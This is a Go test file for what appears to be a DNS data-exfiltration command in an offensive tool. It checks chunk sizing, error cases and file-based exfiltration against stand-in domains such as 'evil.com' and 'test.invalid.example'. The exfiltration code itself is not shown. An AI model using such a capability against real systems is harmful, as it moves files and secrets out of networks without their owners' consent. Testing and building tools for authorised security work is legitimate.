package commands

import (
	"os"
	"strings"
	"testing"
)

func TestDnsExfilChunkSize(t *testing.T) {
	tests := []struct {
		domain string
		minExp int
	}{
		{"evil.com", 10},
		{"a.b.c.d.evil.com", 5},
		{strings.Repeat("a", 250), 0}, // Too long
	}
	for _, tt := range tests {
		size := dnsExfilChunkSize(tt.domain)
		if size < tt.minExp {
			t.Errorf("dnsExfilChunkSize(%q) = %d, want >= %d", tt.domain, size, tt.minExp)
		}
	}
}

func TestDnsExfilChunkSize_ShortDomain(t *testing.T) {
	size := dnsExfilChunkSize("x.co")
	if size <= 0 {
		t.Error("expected positive chunk size for short domain")
	}
	// For a 4-char domain, chunk should be close to max label / 2
	if size > 30 {
		t.Logf("chunk size = %d (max label limited)", size)
	}
}

func TestDnsExfil_MissingTarget(t *testing.T) {
	result := dnsExfil(dnsArgs{
		Action: "exfil",
		Data:   "test data",
	})
	if result.Status != "error" {
		t.Error("expected error for missing target")
	}
}

func TestDnsExfil_MissingData(t *testing.T) {
	result := dnsExfil(dnsArgs{
		Action: "exfil",
		Target: "evil.com",
	})
	if result.Status != "error" {
		t.Error("expected error for missing data")
	}
}

func TestDnsExfil_FileNotFound(t *testing.T) {
	// File path that doesn't exist — should treat as raw string
	result := dnsExfil(dnsArgs{
		Action: "exfil",
		Target: "test.invalid.example", // Non-routable domain
		Data:   "raw data to exfiltrate",
		Delay:  1, // Minimal delay for test speed
		Jitter: 0,
	})
	// Should succeed (DNS lookups will fail silently)
	if result.Status != "success" {
		t.Errorf("expected success for raw string exfil, got: %s", result.Output)
	}
	if !strings.Contains(result.Output, "Exfiltration Complete") {
		t.Error("expected completion message")
	}
}

func TestDnsExfil_FromFile(t *testing.T) {
	// Create temp file with test data
	tmpFile, err := os.CreateTemp("", "dns-exfil-test-*.txt")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.WriteString("test file content for dns exfil")
	tmpFile.Close()

	result := dnsExfil(dnsArgs{
		Action: "exfil",
		Target: "test.invalid.example",
		Data:   tmpFile.Name(),
		Delay:  1,
		Jitter: 0,
	})
	if result.Status != "success" {
		t.Errorf("expected success for file exfil, got: %s", result.Output)
	}
	if !strings.Contains(result.Output, "30 bytes") {
		t.Errorf("expected data size in output, got: %s", result.Output)
	}
}

func TestDnsExfil_DomainTooLong(t *testing.T) {
	result := dnsExfil(dnsArgs{
		Action: "exfil",
		Target: strings.Repeat("a", 250) + ".com",
		Data:   "test",
	})
	if result.Status != "error" {
		t.Error("expected error for domain too long")
	}
}

func TestDnsExfil_EmptyFile(t *testing.T) {
	tmpFile, err := os.CreateTemp("", "dns-exfil-empty-*.txt")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.Close()

	result := dnsExfil(dnsArgs{
		Action: "exfil",
		Target: "test.invalid.example",
		Data:   tmpFile.Name(),
	})
	if result.Status != "error" {
		t.Error("expected error for empty file")
	}
}
